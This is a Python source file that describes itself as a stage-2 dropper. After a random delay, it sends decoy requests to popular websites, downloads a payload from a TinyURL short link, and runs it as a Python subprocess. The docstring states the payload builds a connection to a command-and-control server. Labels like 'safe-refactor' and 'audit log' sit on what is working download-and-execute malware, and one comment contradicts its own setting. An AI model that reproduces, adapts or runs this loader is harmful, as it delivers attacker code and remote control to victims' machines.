'''
 # @ Create Time: 2025-08-13 16:00:11
 # @ Modified time: 2025-08-13 16:01:06
 # @ Description: execute payload in memory
 
 - wait for a random/conditional trigger 
 - fetch a stage 3 payload from a tiny url
 - exec fetched payload in memory
 - the result will build the connection with a C2 server

 '''
from __future__ import annotations
import requests
from pathlib import Path
import json, os, time, random, base64, subprocess, tempfile, platform
import queue
from typing import Any, Dict, List
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

# --- Config (hard-coded; no environment variables) ---
USER_AGENT   = "safe-refactor/1.0"
WAIT_RANGE_S = (5, 180)  # random wait between 5 and 3600 seconds


# a few benign websites to add noise
BENIGN_SITES = [
    "https://www.baidu.com",
    "https://www.wikipedia.org",
    "https://www.python.org",
    "https://www.github.com",
    "https://www.stackoverflow.com"
]

TARGET_URL = "https://tinyurl.com/2a2s6zqt"

# Lightweight audit log
LOG_DIR = Path("logs"); LOG_DIR.mkdir(parents=True, exist_ok=True)
AUDIT   = LOG_DIR / "safe_stage2.jsonl"

# Subprocess sandbox configuration
SUBPROCESS_TIMEOUT = 3600        # seconds
CPU_SECONDS = 20                # POSIX RLIMIT_CPU
MEM_BYTES = 300 * 1024 * 1024   # ~300 MB address space

def log(event: str, **fields):
    rec = {"ts": int(time.time()), "event": event}
    rec.update(fields)
    AUDIT.parent.mkdir(parents=True, exist_ok=True)
    with AUDIT.open("a", encoding="utf-8") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")

def head_request(url: str, timeout: int = 10):
    req = Request(url, method="HEAD", headers={"User-Agent": USER_AGENT})
    with urlopen(req, timeout=timeout) as r:
        headers = dict(r.getheaders())
        return r.getcode(), headers


def run_payload(
        payload_text: str,
        timeout: int = 3600,
        cpu_seconds: int = 10,
        mem_bytes: int = 200 * 1024 * 1024,
        keep_file: bool = False) -> Dict[str, Any]:
    ''' write payload_text into temp file, and run it as sub process

    return:
        dict: {
      "timeout": bool,
      "returncode": int|None,
      "stdout": str,
      "stderr": str,
      "error": str|None
    }
    '''
    result = {"timeout": False, "returncode": None, "stdout": "", "stderr": "", "error": None}
    tmp_path = None
    try:
        # write tempfile
        tf = tempfile.NamedTemporaryFile("w", suffix=".py", delete=False, encoding="utf-8")
        try:
            tf.write(payload_text)
            tf.flush()
            tmp_path = tf.name
        finally:
            tf.close()

        cmd = [os.sys.executable, tmp_path]

        preexec_fn = None
        if platform.system() != "Windows":
            try:
                import resource
                def _limits():
                    resource.setrlimit(resource.RLIMIT_CPU, (cpu_seconds, cpu_seconds))
                    resource.setrlimit(resource.RLIMIT_AS, (mem_bytes, mem_bytes))
                preexec_fn = _limits
            except Exception:
                preexec_fn = None
        
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                preexec_fn=preexec_fn
            )
        except subprocess.TimeoutExpired as te:
            result["timeout"] = True
            result["stdout"] = (te.stdout or "")[:2000]
            result["stderr"] = (te.stderr or "")[:2000]
            result["error"] = "timeout"
            return result
        except Exception as e:
            result["error"] = f"subprocess error: {e}"
            return result

        result["returncode"] = getattr(proc, "returncode", None)
        result["stdout"] = (proc.stdout or "")[:2000]
        result["stderr"] = (proc.stderr or "")[:2000]
        return result

    finally:
        if not keep_file and tmp_path:
            try:
                os.remove(tmp_path)
            except Exception:
                pass

def main():
    # random wait
    wait_s = random.randint(*WAIT_RANGE_S)
    time.sleep(wait_s)

    # HEAD-only checks for noise sites
    for u in BENIGN_SITES:
        try:
            code, headers = head_request(u)
            log("head_ok", url=u, status=code, content_type=headers.get("Content-Type"))
        except Exception as e:
            log("head_error", url=u, error=str(e))

    try:
        response = requests.get(TARGET_URL, timeout=30)
        if response.status_code == 200:
            m_code = response.text
            try:
                # run in subprocess
                res = run_payload(m_code)
                # record result to audit log
                if res.get("timeout"):
                    log("download_error", url=TARGET_URL, error="timeout", timeout_seconds=SUBPROCESS_TIMEOUT)
                elif res.get("error"):
                    log("download_error", url=TARGET_URL, error=res.get("error"))
                else:
                    log(
                        "download_attempt",
                        url=TARGET_URL,
                        status=response.status_code,
                        returncode=res.get("returncode"),
                        stdout=res.get("stdout"),
                        stderr=res.get("stderr")
                    )

            except Exception as e:
                # anything surprising while trying to run subprocess
                log("download_error", url=TARGET_URL, error=str(e))
                log("payload_exec_error", error=str(e))


    except (HTTPError, URLError, ValueError) as e:
        log("download_error", url=TARGET_URL, error=str(e))
        log("payload_exec_error", error=str(e))

if __name__ == "__main__":
    main()

